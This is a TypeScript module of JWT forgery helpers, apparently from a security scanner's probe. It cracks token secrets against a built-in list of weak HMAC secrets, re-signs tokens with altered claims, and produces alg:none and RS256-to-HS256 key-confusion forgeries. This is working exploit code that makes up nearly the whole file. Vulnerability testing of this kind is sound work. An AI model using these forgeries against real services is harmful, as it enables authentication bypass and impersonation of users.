// JWT confirmation helpers for probe_jwt.
// Two high-signal forgeries, same evidence loop (garbage control rejected + forged token accepted twice):
//   1. weak HMAC secret (HS256/384/512) — crack the live token against a small default-secret wordlist, then mint a new one
//   2. alg:none case variants — signature not verified
//   3. RS256->HS256 key confusion — re-sign the RS256 token as HS256 using the RSA PUBLIC KEY (PEM) as the HMAC secret
//      (a naive verifier that reads the alg from the token header accepts it); the public key comes from the JWKS.
// Not in scope here: jku/x5u (needs a hosted JWKS the target fetches) and kid path/SQLi (no tight in-band oracle).

import { createHmac, createPublicKey, timingSafeEqual } from "node:crypto";

export const ALG_NONE_VARIANTS = ["none", "None", "NONE"] as const;

/** High-signal default / example HMAC secrets. Local HMAC checks are cheap; keep this short so the probe stays a handful of HTTP calls. */
export const JWT_WEAK_SECRETS: readonly string[] = Object.freeze([
  "",
  "secret",
  "Secret",
  "SECRET",
  "secretkey",
  "secret-key",
  "secret_key",
  "jwt",
  "jwt-secret",
  "jwt_secret",
  "jwtsecret",
  "jwt-key",
  "jwt_key",
  "hs256",
  "HS256",
  "password",
  "changeme",
  "changeit",
  "changeme!",
  "default",
  "key",
  "mysecret",
  "my-secret",
  "my_secret",
  "supersecret",
  "super-secret",
  "super_secret",
  "appsecret",
  "app-secret",
  "app_secret",
  "auth",
  "token",
  "hmac",
  "hmac-secret",
  "hmac_secret",
  "test",
  "testing",
  "dev",
  "development",
  "production",
  "admin",
  "qwerty",
  "123456",
  "12345678",
  "null",
  "undefined",
  "your-256-bit-secret",
  "your-256-bit-secret-key",
  "a-string-secret-at-least-256-bits-long",
  "thisissecret",
  "keyboard cat",
]);

export interface JwtParts {
  header: Record<string, unknown>;
  payload: Record<string, unknown>;
  signature: string;
}

export interface JwtCandidate {
  token: string;
  technique: string;
  /** Present when the live token was cracked with a wordlist secret (operator needs it to reproduce). */
  secret?: string;
}

function b64urlDecode(s: string): string {
  const pad = s.length % 4 === 0 ? "" : "=".repeat(4 - (s.length % 4));
  return Buffer.from(s.replace(/-/g, "+").replace(/_/g, "/") + pad, "base64").toString("utf8");
}

function b64urlEncode(s: string): string {
  return Buffer.from(s, "utf8").toString("base64").replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}

function hmacDigest(alg: string): "sha256" | "sha384" | "sha512" | null {
  const a = alg.trim().toUpperCase();
  if (a === "HS256") return "sha256";
  if (a === "HS384") return "sha384";
  if (a === "HS512") return "sha512";
  return null;
}

function sigEqual(a: string, b: string): boolean {
  const left = Buffer.from(a);
  const right = Buffer.from(b);
  if (left.length !== right.length) return false;
  return timingSafeEqual(left, right);
}

export function parseJwt(token: string): JwtParts | null {
  const parts = token.split(".");
  if (parts.length < 2 || !parts[0] || !parts[1]) return null;
  try {
    const header = JSON.parse(b64urlDecode(parts[0])) as unknown;
    const payload = JSON.parse(b64urlDecode(parts[1])) as unknown;
    if (!header || typeof header !== "object" || Array.isArray(header)) return null;
    if (!payload || typeof payload !== "object" || Array.isArray(payload)) return null;
    return { header: header as Record<string, unknown>, payload: payload as Record<string, unknown>, signature: parts[2] ?? "" };
  } catch {
    return null;
  }
}

/** Re-encode a JWT with alg:none (empty signature). Accepted if the server isn't verifying the signature. */
export function forgeAlgNone(token: string, mutate?: (claims: Record<string, unknown>) => void, alg = "none"): string | null {
  const parsed = parseJwt(token);
  if (!parsed) return null;
  const header = { ...parsed.header, alg };
  const payload = { ...parsed.payload };
  if (mutate) mutate(payload);
  return `${b64urlEncode(JSON.stringify(header))}.${b64urlEncode(JSON.stringify(payload))}.`;
}

export function crackJwtHmac(token: string, secrets: readonly string[] = JWT_WEAK_SECRETS): { secret: string; alg: string } | null {
  const parts = token.split(".");
  if (parts.length !== 3 || !parts[0] || !parts[1] || parts[2] === undefined) return null;
  const parsed = parseJwt(token);
  if (!parsed) return null;
  const alg = typeof parsed.header.alg === "string" ? parsed.header.alg : "HS256";
  const digest = hmacDigest(alg);
  if (!digest) return null;
  const data = `${parts[0]}.${parts[1]}`;
  const expected = parts[2].replace(/=+$/, "");
  for (const secret of secrets) {
    const sig = createHmac(digest, secret).update(data).digest("base64url").replace(/=+$/, "");
    if (sigEqual(sig, expected)) return { secret, alg: alg.trim().toUpperCase() };
  }
  return null;
}

export function forgeJwtHmac(token: string, secret: string, mutate?: (claims: Record<string, unknown>) => void): string | null {
  const parsed = parseJwt(token);
  if (!parsed) return null;
  const alg = typeof parsed.header.alg === "string" ? parsed.header.alg : "HS256";
  const digest = hmacDigest(alg);
  if (!digest) return null;
  const header = { ...parsed.header };
  const payload = { ...parsed.payload };
  if (mutate) mutate(payload);
  const h = b64urlEncode(JSON.stringify(header));
  const p = b64urlEncode(JSON.stringify(payload));
  const sig = createHmac(digest, secret).update(`${h}.${p}`).digest("base64url").replace(/=+$/, "");
  return `${h}.${p}.${sig}`;
}

/** RS256->HS256 key confusion: re-sign the same header/payload as HS256 using the RSA PUBLIC KEY (PEM) as the HMAC
 *  secret. A naive verifier that selects the algorithm from the token header (HS256) verifies the HMAC with what it
 *  believes is the RSA public key — which the attacker also has — so the forged token is accepted. */
export function forgeJwtKeyConfusion(token: string, publicKeyPem: string, mutate?: (claims: Record<string, unknown>) => void): string | null {
  const parsed = parseJwt(token);
  if (!parsed || !publicKeyPem) return null;
  const header = { ...parsed.header, alg: "HS256" };
  const payload = { ...parsed.payload };
  if (mutate) mutate(payload);
  const h = b64urlEncode(JSON.stringify(header));
  const p = b64urlEncode(JSON.stringify(payload));
  const sig = createHmac("sha256", publicKeyPem).update(`${h}.${p}`).digest("base64url").replace(/=+$/, "");
  return `${h}.${p}.${sig}`;
}

/** Derive the first RSA public key from a JWKS document as an SPKI PEM (for RS256->HS256 confusion). */
export function pemFromJwks(jwksJson: string): string | null {
  try {
    const jwks = JSON.parse(jwksJson) as { keys?: Array<Record<string, unknown>> };
    const key = (Array.isArray(jwks.keys) ? jwks.keys : []).find((k) => k.kty === "RSA" && typeof k.n === "string" && typeof k.e === "string");
    if (!key) return null;
    const pub = createPublicKey({ key, format: "jwk" } as unknown as Parameters<typeof createPublicKey>[0]);
    return pub.export({ type: "spki", format: "pem" }).toString();
  } catch {
    return null;
  }
}

/** Default payload tweak so a cracked-secret forge is not a replay of the stolen token. Identity claims stay intact. */
export function bumpJwtExp(claims: Record<string, unknown>): void {
  if (typeof claims.exp === "number" && Number.isFinite(claims.exp)) claims.exp = claims.exp + 60;
  else claims.exp = Math.floor(Date.now() / 1000) + 3600;
}

/** Ordered candidates: weak HMAC first (more specific root cause), then alg:none variants. */
export function jwtForgeCandidates(token: string, mutate?: (claims: Record<string, unknown>) => void, opts: { publicKeyPem?: string } = {}): JwtCandidate[] {
  const out: JwtCandidate[] = [];
  const cracked = crackJwtHmac(token);
  if (cracked) {
    const forged = forgeJwtHmac(token, cracked.secret, mutate);
    if (forged) out.push({ token: forged, technique: `weak-hmac:${cracked.alg}`, secret: cracked.secret });
  }
  // RS256->HS256 key confusion when a public key (from the JWKS) is available and the token is asymmetric-signed.
  if (opts.publicKeyPem) {
    const parsed = parseJwt(token);
    const alg = parsed && typeof parsed.header.alg === "string" ? parsed.header.alg.trim().toUpperCase() : "";
    if (/^(?:RS|PS|ES)(?:256|384|512)$/.test(alg)) {
      const forged = forgeJwtKeyConfusion(token, opts.publicKeyPem, mutate);
      if (forged) out.push({ token: forged, technique: `key-confusion:${alg}->HS256` });
    }
  }
  for (const alg of ALG_NONE_VARIANTS) {
    const forged = forgeAlgNone(token, mutate, alg);
    if (forged) out.push({ token: forged, technique: `alg:${alg}` });
  }
  return out;
}
